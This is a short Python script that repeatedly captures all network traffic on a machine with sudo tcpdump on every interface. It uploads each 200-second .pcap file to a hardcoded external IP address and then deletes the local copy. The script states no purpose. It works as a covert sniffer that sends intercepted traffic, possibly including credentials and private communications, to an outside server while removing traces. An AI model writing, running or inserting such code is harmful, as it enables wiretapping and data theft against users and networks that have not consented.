import requests
import os

urla="http://34.121.145.32"
timer=200
url=urla+"/uploader"

file_number=0
while(True):
    os.system('sudo timeout '+str(timer)+' tcpdump -w '+str(file_number)+'.pcap -i any')
    files = {'file': open(str(file_number)+'.pcap', 'rb')}
    getdata = requests.post(url, files=files)
    os.system('sudo rm '+str(file_number)+'.pcap')
    file_number+=1
